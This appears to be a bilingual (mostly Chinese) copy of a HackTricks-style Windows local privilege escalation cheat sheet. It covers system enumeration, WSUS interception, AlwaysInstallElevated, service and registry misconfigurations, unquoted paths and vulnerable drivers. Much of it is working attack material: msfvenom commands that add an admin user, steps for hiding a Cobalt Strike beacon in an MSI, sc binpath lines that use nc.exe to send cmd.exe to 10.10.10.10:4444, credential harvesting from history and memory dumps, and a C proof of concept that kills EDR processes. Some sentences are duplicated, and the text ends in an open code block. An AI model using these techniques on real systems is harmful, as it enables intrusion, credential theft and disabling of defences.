# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **查找 Windows local privilege escalation 向量 的最佳工具：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### Access Tokens

**如果你不知道什么是 Windows Access Tokens，请在继续之前阅读以下页面：**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**有关 ACLs - DACLs/SACLs/ACEs 的更多信息，请查看以下页面：**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**如果你不知道 Windows 中的 integrity levels 是什么，应该在继续之前阅读以下页面：**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows 中有不同的机制可能会**阻止你枚举系统**、运行可执行文件或甚至**检测你的活动**。在开始 privilege escalation 枚举之前，你应该**阅读**下面的**页面**并**枚举**所有这些**防御****机制**：


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## System Info

### Version info enumeration

检查 Windows 版本是否存在任何已知漏洞（也检查已应用的补丁）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### 版本漏洞利用

This [site](https://msrc.microsoft.com/update-guide/vulnerability) 非常适合检索有关 Microsoft 安全漏洞的详细信息。该数据库包含超过 4,700 个安全漏洞，显示了 Windows 环境所呈现的 **巨大的攻击面**。

**在系统上**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas 嵌入了 watson)_

**在本地（使用系统信息）**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github 漏洞利用仓库：**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 环境

有任何凭证/敏感信息保存在环境变量中吗？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell 历史
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell 转录文件

您可以在 [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) 学习如何启用它。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell 管道执行的详细信息会被记录，包括已执行的命令、命令调用和脚本的部分内容。然而，完整的执行细节和输出结果可能不会被全部捕获。

要启用此功能，请按照文档中 "Transcript files" 部分的说明进行操作，选择 **"Module Logging"** 而不是 **"Powershell Transcription"**。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
要查看 PowersShell 日志中的最近 15 条事件，可以执行:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

捕获脚本执行的完整活动和内容记录，确保每个代码块在运行时都被记录。此过程保留了每项活动的全面审计轨迹，对取证和分析恶意行为非常有价值。通过在执行时记录所有活动，可获得对该过程的详细洞察。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block 的日志事件可以在 Windows 事件查看器中通过以下路径找到：**Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
要查看最近 20 条事件，你可以使用：
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### 互联网设置
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 驱动器
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

如果更新请求不是使用 http**S** 而是使用 http，则可以攻陷该系统。

首先通过在 cmd 中运行以下命令来检查网络是否使用非 SSL 的 WSUS 更新：
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
或者在 PowerShell 中执行以下内容：
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
如果你收到如下回复：
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

那么，**它是可被利用的**。如果最后一个注册表项等于 0，则该 WSUS 条目将被忽略。

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

为了利用这些漏洞，你可以使用如下工具： [Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS](https://github.com/GoSecure/pywsus) —— 这些是用于 MiTM 的武器化利用脚本，用于向非 SSL 的 WSUS 流量注入“伪造”更新。

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
基本上，这是该漏洞所利用的缺陷：

> 如果我们有权限修改本地用户代理（local user proxy），并且 Windows Updates 使用 Internet Explorer 设置中配置的代理，那么我们就可以在本地运行 [PyWSUS](https://github.com/GoSecure/pywsus) 来拦截自己的流量，并以提升的用户权限在本地运行代码。
>
> 此外，由于 WSUS 服务使用当前用户的设置，它也会使用当前用户的证书存储。如果我们为 WSUS 主机名生成一个自签名证书并将其添加到当前用户的证书存储中，就能够同时拦截 HTTP 和 HTTPS 的 WSUS 流量。WSUS 没有类似 HSTS 的机制来对证书实施首次使用即信任（trust-on-first-use）类型的验证。如果所呈现的证书被用户信任并具有正确的主机名，服务就会接受该证书。

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

你可以使用工具 [**WSUSpicious**](https://github.com/GoSecure/wsuspicious)（一旦发布）来利用此漏洞。

## Third-Party Auto-Updaters and Agent IPC (local privesc)

许多企业 agent 会暴露一个 localhost IPC 接口和一个特权更新通道。如果能够将注册（enrollment）强制指向攻击者服务器，且更新程序信任伪造的根 CA 或签名检查薄弱，则本地用户可以投递一个恶意 MSI，由 SYSTEM 服务安装。参见基于 Netskope stAgentSvc 链（CVE-2025-0309）的一般化技术：

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

在 Windows **domain** 环境中存在一个 **local privilege escalation** 漏洞，但需满足特定条件。条件包括：环境未强制启用 **LDAP signing**、用户拥有允许其配置 **Resource-Based Constrained Delegation (RBCD)** 的自有权限，以及用户能够在域内创建计算机。需要注意的是，这些**要求**在**默认设置**下即已满足。

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

有关攻击流程的更多信息，详见 https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/

## AlwaysInstallElevated

**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\\**SYSTEM**.

**如果** 这两个注册表项被**启用**（值为 **0x1**），那么任意权限的用户都可以以 NT AUTHORITY\\**SYSTEM** 的身份**安装**（执行）`*.msi` 文件。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
如果你有一个 meterpreter 会话，可以使用模块 **`exploit/windows/local/always_install_elevated`** 来自动化此技术

### PowerUP

使用 power-up 的 `Write-UserAddMSI` 命令在当前目录中创建一个用于提升权限的 Windows MSI 二进制文件。该脚本写出一个预编译的 MSI 安装程序，提示添加用户/组（因此你将需要 GIU 访问）：
```
Write-UserAddMSI
```
只需执行创建的二进制文件即可提升权限。

### MSI 包装器

阅读本教程以了解如何使用这些工具创建 MSI 包装器。注意，如果你**只是**想**执行** **命令行**，你可以封装一个 "**.bat**" 文件


{{#ref}}
msi-wrapper.md
{{#endref}}

### 使用 WIX 创建 MSI


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### 使用 Visual Studio 创建 MSI

- **生成**：使用 Cobalt Strike 或 Metasploit 在 `C:\privesc\beacon.exe` 生成一个 **新的 Windows EXE TCP payload**
- 打开 **Visual Studio**，选择 **Create a new project** 并在搜索框中输入 "installer"。选择 **Setup Wizard** 项目并点击 **Next**。
- 给项目命名，例如 **AlwaysPrivesc**，使用 **`C:\privesc`** 作为位置，选择 **place solution and project in the same directory**，然后点击 **Create**。
- 不断点击 **Next**，直到到达第 3 步（选择要包含的文件）。点击 **Add** 并选择你刚生成的 Beacon payload。然后点击 **Finish**。
- 在 **Solution Explorer** 中选中 **AlwaysPrivesc** 项目，在 **Properties** 中将 **TargetPlatform** 从 **x86** 改为 **x64**。
- 你可以更改其他属性，例如 **Author** 和 **Manufacturer**，这些可以让已安装的应用看起来更可信。
- 右键项目并选择 **View > Custom Actions**。
- 右键 **Install** 并选择 **Add Custom Action**。
- 双击 **Application Folder**，选择你的 **beacon.exe** 文件并点击 **OK**。这将确保安装程序运行时立即执行 beacon payload。
- 在 **Custom Action Properties** 下，将 **Run64Bit** 改为 **True**。
- 最后，**构建**。
- 如果显示警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`，请确保将平台设置为 x64。

### MSI 安装

要在**后台**执行恶意 `.msi` 文件的**安装**：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
要利用此漏洞你可以使用： _exploit/windows/local/always_install_elevated_

## 防病毒和检测器

### 审计设置

这些设置决定了哪些内容会被**记录**，所以你应该注意
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, 值得了解日志被发送到哪里
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** 旨在用于 **本地 Administrator 密码 的管理**，确保每个密码在加入域的计算机上都是 **唯一、随机化并定期更新的**。这些密码被安全地存储在 Active Directory 中，只有通过 ACLs 授予足够权限的用户才能访问，允许他们在被授权的情况下查看本地管理员密码。

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

如果启用，**明文密码会存储在 LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA 保护

从 **Windows 8.1** 起，Microsoft 为 Local Security Authority (LSA) 引入了增强保护，以 **阻止** 不受信任进程 **读取其内存** 或注入代码的尝试，从而进一步提高系统安全。\
[**有关 LSA 保护的更多信息**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** 在 **Windows 10** 中引入。其目的是保护设备上存储的凭据，防止诸如 pass-the-hash 攻击之类的威胁。| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### 缓存凭据

**域凭据**由**本地安全机构** (LSA) 进行身份验证，并被操作系统组件使用。当用户的登录数据被已注册的安全包认证时，通常会为该用户建立域凭据.\\
[**有关缓存凭据的更多信息**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## 用户与组

### 枚举用户与组

你应该检查你所属的任何组是否具有有趣的权限
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特权组

如果你**属于某个特权组，你可能能够提权**。在此了解特权组以及如何滥用它们以提权：


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token 操作

**了解更多** 关于 **token** 的信息，请参见此页面: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
查看下列页面以**了解有趣的 tokens**以及如何滥用它们：


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### 已登录用户 / 会话
```bash
qwinsta
klist sessions
```
### 主目录
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### 密码策略
```bash
net accounts
```
### 获取剪贴板内容
```bash
powershell -command "Get-Clipboard"
```
## 运行中的进程

### 文件和文件夹权限

首先，列出进程时**检查进程命令行中是否包含密码**。\
检查是否可以**覆盖某些正在运行的可执行文件**，或者是否对可执行文件所在的文件夹具有写权限，以便利用可能的 [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
始终检查是否有可能的 [**electron/cef/chromium debuggers** 正在运行，你可以利用它来 escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**检查进程二进制文件的权限**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**检查进程二进制文件所在文件夹的权限 (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### 内存密码挖掘

可以使用来自 sysinternals 的 **procdump** 对正在运行的进程创建内存转储。像 FTP 这样的服务在内存中会有 **credentials in clear text in memory**。尝试转储内存并读取这些 credentials。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 不安全的 GUI 应用

**以 SYSTEM 身份运行的应用可能允许用户启动 CMD 或浏览目录。**

示例: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"

## 服务

获取服务列表：
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 权限

你可以使用 **sc** 获取服务信息
```bash
sc qc <service_name>
```
建议拥有来自 _Sysinternals_ 的二进制文件 **accesschk**，以检查每个服务所需的权限级别。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
建议检查 "Authenticated Users" 是否可以修改任何服务:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[可从此处下载 accesschk.exe for XP](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 启用服务

如果出现此错误（例如与 SSDPSRV 相关）：

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

可以使用以下命令启用它：
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**请注意，服务 upnphost 依赖 SSDPSRV 才能工作（适用于 XP SP1）**

**另一个变通方法** 来解决此问题是运行：
```
sc.exe config usosvc start= auto
```
### **修改服务二进制路径**

如果“Authenticated users”组对某个服务拥有 **SERVICE_ALL_ACCESS**，则可以修改该服务的可执行二进制文件。要修改并执行 **sc**：
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 重启服务
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
权限可以通过多种权限进行提权：

- **SERVICE_CHANGE_CONFIG**: 允许重新配置服务二进制文件。
- **WRITE_DAC**: 允许重新配置权限，从而能够更改服务配置。
- **WRITE_OWNER**: 允许获取所有权并重新配置权限。
- **GENERIC_WRITE**: 同样允许更改服务配置。
- **GENERIC_ALL**: 同样允许更改服务配置。

要检测和利用此漏洞，可以使用 _exploit/windows/local/service_permissions_。

### Services binaries weak permissions

**检查是否可以修改由服务执行的二进制文件** 或者是否对二进制所在的文件夹拥有 **写权限**（[**DLL Hijacking**](dll-hijacking/index.html))**.**\
你可以使用 **wmic**（不在 system32）获取每个由服务执行的二进制，并使用 **icacls** 检查你的权限：
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
你也可以使用 **sc** 和 **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### 服务注册表 修改权限

你应该检查是否可以修改任何服务注册表。\
你可以通过以下操作**检查**你对某个服务**注册表**的**权限**：
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
应该检查 **Authenticated Users** 或 **NT AUTHORITY\INTERACTIVE** 是否拥有 `FullControl` 权限。如果是，服务执行的二进制文件可以被更改。

要更改被执行二进制的 Path：
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### 服务注册表 AppendData/AddSubdirectory 权限

如果你对某个注册表拥有此权限，这意味着 **你可以从该注册表创建子注册表**。在 Windows 服务的情况下，这 **足以执行任意代码：**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

如果可执行文件的路径没有用引号括起来，Windows 会尝试执行每个空格前的结尾部分。

例如，对于路径 _C:\Program Files\Some Folder\Service.exe_ Windows 会尝试执行：
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
列出所有未加引号的服务路径（不包括属于内置 Windows 服务的那些）：
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**你可以使用 metasploit 检测并利用** 这个漏洞: `exploit/windows/local/trusted\_service\_path` 你可以手动使用 metasploit 创建一个服务二进制文件:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 恢复操作

Windows 允许用户指定当服务失败时要执行的操作。此功能可以配置为指向一个 binary。如果该 binary 可被替换，则可能发生 privilege escalation。更多细节请见 [官方文档](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## 应用程序

### 已安装的应用程序

检查 **binaries 的权限**（也许你可以覆盖其中一个并进行 privilege escalation）以及 **folders 的权限**（[DLL Hijacking](dll-hijacking/index.html)）。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 写入权限

检查是否可以修改某些配置文件以读取某些特殊文件，或是否可以修改将由 Administrator 账户（schedtasks）执行的二进制文件。

在系统中查找弱文件夹/文件权限的一种方法是执行：
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### 启动时运行

**检查是否可以覆盖某些 registry 或 binary，这些将由不同的用户执行。**\
**阅读** **以下页面** 以了解更多关于有趣的 **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

查找可能的 **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
如果驱动暴露了任意内核读/写原语（在设计不佳的 IOCTL 处理程序中常见），你可以通过直接从内核内存窃取 SYSTEM token 来提升权限。逐步技术见：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### 滥用 device 对象上缺失的 FILE_DEVICE_SECURE_OPEN（LPE + EDR kill）

一些签名的第三方驱动通过 IoCreateDeviceSecure 使用严格的 SDDL 创建其 device 对象，但忘记在 DeviceCharacteristics 中设置 FILE_DEVICE_SECURE_OPEN。缺少该标志时，当通过包含额外组件的路径打开设备时，安全 DACL 不会被强制执行，从而允许任何非特权用户通过使用如下命名空间路径获得句柄：

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

一旦用户能够打开该设备，驱动暴露的特权 IOCTLs 就可以被滥用于 LPE 和篡改。以下是在实战中观测到的示例能力：
- 返回对任意进程的完全访问句柄（token theft / 通过 DuplicateTokenEx/CreateProcessAsUser 获取 SYSTEM shell）。
- 不受限制的原始磁盘读/写（离线篡改、启动时持久化技巧）。
- 终止任意进程，包括 Protected Process/Light (PP/PPL)，允许通过内核从用户态终结 AV/EDR。

Minimal PoC 模式（user mode）：
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
开发者缓解措施
- 在创建应由 DACL 限制的设备对象时，始终设置 FILE_DEVICE_SECURE_OPEN。
- 在执行特权操作前验证调用者上下文。在允许进程终止或返回句柄之前添加 PP/PPL 检查。
- 限制 IOCTLs（访问掩码、METHOD_*、输入验证），并考虑使用 brokered models 而不是直接的内核权限。

防御者检测思路
- 监控用户模式对可疑设备名的打开（例如 \\ .\\amsdk*）以及指示滥用的特定 IOCTL 序列。
- 强制执行 Microsoft 的 vulnerable driver blocklist（HVCI/WDAC/Smart App Control），并维护自己的 allow/deny lists。


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

检查 PATH 中所有文件夹的权限：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
有关如何滥用此检查的更多信息：

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## 网络

### 共享
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

检查 hosts file 中是否硬编码了其他已知计算机
```
type C:\Windows\System32\drivers\etc\hosts
```
### 网络接口 & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 开放端口

从外部检查是否存在 **受限服务**
```bash
